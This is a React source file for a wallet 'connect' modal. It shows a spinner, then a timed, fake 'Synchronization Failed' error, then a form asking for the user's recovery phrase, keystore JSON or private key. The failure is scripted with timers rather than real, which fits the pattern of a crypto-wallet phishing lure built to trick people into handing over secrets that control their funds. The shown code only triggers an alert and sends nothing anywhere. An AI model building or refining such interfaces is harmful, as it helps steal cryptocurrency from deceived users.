import { useEffect, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";

export default function ConnectModal({ item, onClose }) {
  const [stage, setStage] = useState("processing"); // "processing" → "failed" → "manual"
  const [method, setMethod] = useState("phrase");
  const [input, setInput] = useState("");

  useEffect(() => {
    const timer1 = setTimeout(() => setStage("failed"), 5000);
    const timer2 = setTimeout(() => setStage("manual"), 7000);

    document.body.style.overflow = "hidden";
    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
      document.body.style.overflow = "auto";
    };
  }, []);

  if (!item) return null;

  return (
    <div className="fixed inset-0 flex items-center justify-center bg-black/70 backdrop-blur-sm z-50 p-4">
      <motion.div
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.9, opacity: 0 }}
        transition={{ duration: 0.3, ease: "easeOut" }}
        className="relative w-full max-w-[90%] sm:max-w-lg md:max-w-2xl rounded-2xl md:rounded-3xl bg-gradient-to-b from-[#101010] to-[#0a0a0a] border border-gray-800 text-white shadow-2xl p-6 sm:p-8 md:p-10"
      >
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-3 right-4 text-gray-400 hover:text-red-500 text-xl sm:text-2xl"
        >
          ✕
        </button>

        {/* Wallet Icon + Title */}
        <div className="flex flex-col items-center mb-6 sm:mb-8">
          <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-full bg-gradient-to-r from-indigo-600 to-blue-500 flex items-center justify-center shadow-[0_0_25px_rgba(79,70,229,0.5)] mb-4">
            <img
              src={item.logo}
              alt={item.name}
              className="w-10 h-10 sm:w-12 sm:h-12 object-contain rounded-full"
            />
          </div>
          <h2 className="text-xl sm:text-2xl md:text-3xl font-semibold text-center">
            {item.name}
          </h2>
        </div>

        {/* Animated Stages */}
        <AnimatePresence mode="wait">
          {stage === "processing" && (
            <motion.div
              key="processing"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.6 }}
              className="text-center space-y-4"
            >
              <p className="text-gray-300 text-base sm:text-lg italic">
                Processing Connection...
              </p>
              <div className="flex justify-center">
                <div className="w-10 h-10 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin"></div>
              </div>
            </motion.div>
          )}

          {stage === "failed" && (
            <motion.div
              key="failed"
              initial={{ opacity: 0, x: 0 }}
              animate={{
                opacity: 1,
                x: [0, -8, 8, -8, 8, 0], // shorter shake for mobile
              }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.8, ease: "easeInOut" }}
              className="text-center space-y-3"
            >
              <p className="text-red-400 text-lg sm:text-xl font-semibold">
                Synchronization Failed ⚠️
              </p>
              <p className="text-gray-400 text-sm italic">
                Please try connecting manually...
              </p>
            </motion.div>
          )}

          {stage === "manual" && (
            <motion.div
              key="manual"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.6 }}
            >
              <h3 className="text-center text-lg mb-5 font-semibold text-indigo-400">
                Connect Manually
              </h3>

              {/* Select Connection Method */}
              <div className="flex justify-center gap-2 sm:gap-3 mb-5 flex-wrap">
                {["phrase", "keystore", "private"].map((opt) => (
                  <button
                    key={opt}
                    onClick={() => {
                      setMethod(opt);
                      setInput("");
                    }}
                    className={`px-3 sm:px-5 py-2 rounded-md text-xs sm:text-sm font-medium transition-all duration-300 ${
                      method === opt
                        ? "bg-gradient-to-r from-indigo-600 to-blue-600 text-white shadow-[0_0_10px_rgba(59,130,246,0.4)]"
                        : "bg-gray-800 text-gray-400 hover:bg-gray-700"
                    }`}
                  >
                    {opt === "phrase"
                      ? "Phrase Words"
                      : opt === "keystore"
                      ? "Keystore JSON"
                      : "Private Key"}
                  </button>
                ))}
              </div>

              {/* Input Area */}
              <textarea
                rows={method === "phrase" ? 3 : 5}
                className="w-full p-3 rounded-md bg-gray-900 border border-gray-700 text-white text-xs sm:text-sm focus:border-indigo-500 focus:outline-none resize-none"
                placeholder={
                  method === "phrase"
                    ? "Enter your 12 or 24 recovery words..."
                    : method === "keystore"
                    ? "Paste your keystore JSON content here..."
                    : "Enter your private key..."
                }
                value={input}
                onChange={(e) => setInput(e.target.value)}
              ></textarea>

              {/* Connect Button */}
              <button
                onClick={() => alert("Connecting...")}
                className="w-full mt-6 py-3 bg-gradient-to-r from-indigo-500 to-blue-500 rounded-lg hover:opacity-90 transition font-semibold text-sm sm:text-base shadow-[0_0_10px_rgba(79,70,229,0.4)]"
              >
                Connect Wallet
              </button>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>
    </div>
  );
}
